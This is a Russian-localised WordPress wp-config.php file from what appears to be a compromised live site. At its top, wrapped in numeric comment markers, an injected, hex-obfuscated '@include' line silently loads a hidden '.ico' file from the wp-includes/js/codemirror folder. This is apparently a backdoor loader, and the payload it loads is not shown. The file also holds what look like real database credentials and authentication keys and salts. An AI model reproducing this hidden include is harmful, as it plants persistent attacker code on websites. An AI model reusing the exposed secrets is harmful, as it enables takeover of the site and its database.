<?php


/*69278*/

@include "\x2fho\x6de/\x67ul\x66oi\x6cuk\x72ai\x6ee/\x70ub\x6cic\x5fht\x6dl/\x77p-\x69nc\x6cud\x65s/\x6as/\x63od\x65mi\x72ro\x72/.\x30b7\x35a3\x611.\x69co";

/*69278*/
/**
 * Основные параметры WordPress.
 *
 * Скрипт для создания wp-config.php использует этот файл в процессе
 * установки. Необязательно использовать веб-интерфейс, можно
 * скопировать файл в "wp-config.php" и заполнить значения вручную.
 *
 * Этот файл содержит следующие параметры:
 *
 * * Настройки MySQL
 * * Секретные ключи
 * * Префикс таблиц базы данных
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** Параметры MySQL: Эту информацию можно получить у вашего хостинг-провайдера ** //
/** Имя базы данных для WordPress */
define('DB_NAME', 'gulfoilu_gulf');

/** Имя пользователя MySQL */
define('DB_USER', 'gulfoilu_artuh');

/** Пароль к базе данных MySQL */
define('DB_PASSWORD', 'artuhpass');

/** Имя сервера MySQL */
define('DB_HOST', 'localhost');

/** Кодировка базы данных для создания таблиц. */
define('DB_CHARSET', 'utf8');

/** Схема сопоставления. Не меняйте, если не уверены. */
define('DB_COLLATE', '');

/**#@+
 * Уникальные ключи и соли для аутентификации.
 *
 * Смените значение каждой константы на уникальную фразу.
 * Можно сгенерировать их с помощью {@link https://api.wordpress.org/secret-key/1.1/salt/ сервиса ключей на WordPress.org}
 * Можно изменить их, чтобы сделать существующие файлы cookies недействительными. Пользователям потребуется авторизоваться снова.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'MF5*r{25 l_s93S#zai(r`32?._DQ`nVz]=>NXk<Eb@]J;qa.zowqL}`2aZK}*%#');
define('SECURE_AUTH_KEY',  'FdXpBvX$iC@QjZ?Ly?V3hbs@z:@G6jCD&%TA8b)CW}<_5^TpKR H2!ou-Q|w,+fV');
define('LOGGED_IN_KEY',    '{ju/`0/Q30]+}Wde)AO`slm4-@a70uGUJA-Ii2cAn%/I`t_DaZC<WSt+Y`H+gAZN');
define('NONCE_KEY',        '8e+,:X1^*QCZuR&X>7[Z+)L^gFnOZeKy5[cuSz^7d1CUIa}P=<=SbY!3s#+1?<Da');
define('AUTH_SALT',        'q_iUS>b4x|su$loE%:FDiGPdcz`5nW91Y{jxUt8<)+_gM^w:{N{=%iFiDCTOX$0>');
define('SECURE_AUTH_SALT', '#_x`I)!Z82 ?|F6SI3YD%a%{ciTw+YplP1{5cXg;<2t`w)E2zjh9Yyxs{o7F0B<S');
define('LOGGED_IN_SALT',   'A+Maq[0Hq]=F3`lD`dT(L5lwqQ9l`syw{.Qg_6eO6yx,DS=1snx-~2eB^%DgTS$x');
define('NONCE_SALT',       'SCyxO!NY>CsD<| `[O`<gK)U,J*:^|K-i/;9+-*)^%J{;Q}T5:dQW?RL*>~!}ey`');

/**#@-*/

/**
 * Префикс таблиц в базе данных WordPress.
 *
 * Можно установить несколько сайтов в одну базу данных, если использовать
 * разные префиксы. Пожалуйста, указывайте только цифры, буквы и знак подчеркивания.
 */
$table_prefix  = 'wp_';

/**
 * Для разработчиков: Режим отладки WordPress.
 *
 * Измените это значение на true, чтобы включить отображение уведомлений при разработке.
 * Разработчикам плагинов и тем настоятельно рекомендуется использовать WP_DEBUG
 * в своём рабочем окружении.
 *
 * Информацию о других отладочных константах можно найти в Кодексе.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* Это всё, дальше не редактируем. Успехов! */

/** Абсолютный путь к директории WordPress. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Инициализирует переменные WordPress и подключает файлы. */
require_once(ABSPATH . 'wp-settings.php');
